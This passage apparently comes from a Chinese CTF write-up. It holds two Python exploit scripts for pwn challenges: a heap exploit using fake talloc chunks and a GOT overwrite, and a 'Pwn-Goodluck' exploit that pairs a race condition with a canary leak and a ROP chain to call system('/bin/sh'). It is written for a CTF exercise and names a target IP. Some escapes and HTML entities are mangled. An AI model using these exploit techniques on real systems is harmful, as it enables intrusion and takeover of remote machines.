    add(io, '%13$p', 0x100, '111') #0x603070 0x603110   #0
    add(io, '222', 0x100, '222') #0x603280 0x603320   #1
    add(io, '333', 0x100, '333') #0x603490 0x603530   #2
    add(io, '444', 0x100, '444') #0x6036a0 0x603740   #3
    add(io, 'sh;', 0x100, '555') #0x6038b0 0x603950   #4
    add(io, '666', 0x100, '666') #0x603ac0 0x603b60   #5
 
    delete(io, 1)
    delete(io, 2)
 
    heap_ptr = 0x6020f0
    payload = l64(0) + l64(0x211) +l64(heap_ptr-0x18)+l64(heap_ptr-0x10)
    payload = payload[:-1]
 
    add(io, payload[:-1], 0x300, '777') #0x603280 0x603320   #6
    add(io, 'sh;', 0x100, '888')
 
    #io.gdb_hint()
 
    offset = 0x603490 - 0x603320
    #                      size        next    prev     parent
    fake_head1 = l64(0x210)+l64(0x90)+ l64(0) +l64(0)+ l64(0x603a60)
                # child   refs  descutor   name      size       flags                   pool   padding
    fake_head2 = l64(0)+l64(0)+l64(0)+l64(0x400dc4)+l64(0x100)+l64(0x00000000e8150c70)+l64(0)+l64(0)+l64(0)
    fake_head2 = fake_head2.ljust(0x90-0x28, 'x00')
    fake_head2 += l64(0) + l64(0x21) + 'x00'*0x10 + l64(0) + l64(0x21)
 
    fake_head1 = fake_head1[:-6]
    payload = 'x00' + l64(0)+l64(0xa1)+l64(0)+l64(0)+l64(0)+l64(0x6034a0)
    payload = payload[:-6]
    edit(io, 4, 0x100-1, payload)
    edit2(io, 6, offset, fake_head1)
    edit2(io, 6, offset+0x28, fake_head2)
 
    delete(io, 5)
 
    talloc_free_got = 0x602048
    print_plt = 0x4007E0
 
    title = l64(talloc_free_got) + l64(0) + l64(0) + l64(0x6020d0)
    title = title[:-2]
    change(io, 6, title)
 
    change(io, 3, l64(print_plt)[:-1])
 
    io.gdb_hint()
    delete(io, 0)
 
    io.read_until('0x')
    main_ret = int(io.read_until('De')[:-2], 16)
    base = main_ret - 0x0000000000021EC5
    print hex(base)
    system = base + 0x0000000000046640
    print hex(system)
 
    change(io, 3, l64(system)[:-1])
 
    delete(io, 7)
 
    interact(io)
 
exp(target)
```

**<br>**

**Pwn-Goodluck**

****

条件竞争漏洞，g_index的值可以在主线程中修改，然后在第2个子线程中能实现任意地址+1操作。

read_int如果参数为0，可以栈溢出。

脚本：

```
from threading import Thread
# from uploadflag import *
from zio import *
 
target = ('119.254.101.197', 10000)
target = './pwn2'
 
 
def add1(io,type,name,number,some):
      io.read_until("choice:")
      io.writeline('1')
      io.read_until("flower")
      io.writeline(str(type))
      io.read_until('name:')
      io.writeline(name)
      io.read_until('number:')
      io.writeline(str(number))
      io.read_until('again:')
      io.writeline(some)
 
def add2(io, type, name, much, price,   some):
      io.read_until("choice:")
      io.writeline('1')
      io.read_until("flower")
      io.writeline(str(type))
      io.read_until('name:')
      io.writeline(name)
      io.read_until('want:')
      io.writeline(much)
      io.read_until('table:')
      io.writeline(price)
      io.read_until('something:')
      io.writeline(some)
 
def show(io,index):
      io.writeline('4')
      io.read_until('show')
      io.writeline(str(index))
 
def delete(io,index):
      io.writeline('2')
      io.read_until(cs7)
      io.writeline(str(index))
 
def edit(io,index,data):
      io.writeline('3')
      io.read_until('edit:')
      io.writeline(str(index))
      io.read_until('something')
      io.writeline(data)
 
def interact(io):
      def run_recv():
          while True:
            try:
                output =   io.read_until_timeout(timeout=1)
                # print output
            except:
                return
 
      t1 = Thread(target=run_recv)
      t1.start()
      while True:
          d = raw_input()
          if d != '':
            io.writeline(d)
 
 
def exp(target):
      io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), 
             print_write=COLORED(RAW,   'green'))
 
      add1(io, 3, 'bbbb', 100, 'ccccccccc')
      fake_index = (0x2031a0 - 0x203180)/8
      delete(io, 0)
      delete(io, fake_index)
      io.read_until('delete 0')
      show(io, 0)
      io.read_until('s1-&gt;')
      data = io.read_until(' ')[:-1]
      code_base = l64(data.ljust(8, 'x00')) - 0x1040
      print hex(code_base)
 
      canary_addr = code_base + 0x2031c0 + 1
      add2(io, 2, 'aaaa', str(canary_addr&amp;0xffffffff),   str(canary_addr&gt;&gt;32), 'bbbbbbbb')
 
      delete(io, 1)
      delete(io, fake_index + 1)
      io.read_until('delete 1')
      show(io, 1)
      io.read_until("fake show!n")
      cookies = l64(io.read_until('n')[:-1].ljust(8, 'x00')) &lt;&lt; 8
      print 'cookie', hex(cookies)
 
      add1(io, 0, 'cccc',100, '0517')
      io.gdb_hint()
 
      show(io, 2)
      io.read_until('againn')
 
      puts_plt = code_base + 0x0000000000000BC0
      puts_got = code_base + 0x0000000000202F20
      pop_rdi_ret = code_base + 0x0000000000001653
      read_int = code_base + 0x0000000000000F80
      payload = 'a'*0x18 + l64(cookies) + 'aaaaaaaa'*5 + l64(pop_rdi_ret) +   l64(puts_got) + l64(puts_plt) + l64(pop_rdi_ret)+l64(0) + l64(read_int)
 
      io.writeline(payload)
 
      puts = l64(io.readline()[:-1].ljust(8, 'x00'))
      libc_base = puts - 0x000000000006F5D0
 
      print hex(libc_base)
      system = libc_base + 0x0000000000045380
      binsh = libc_base + 0x000000000018C58B
      payload = 'a'*0x18 + l64(cookies) + 'aaaaaaaa'*5 + l64(pop_rdi_ret) +   l64(binsh) + l64(system)
 
      io.writeline(payload)
 
      io.gdb_hint()
      interact(io)
 
 
exp(target)
```
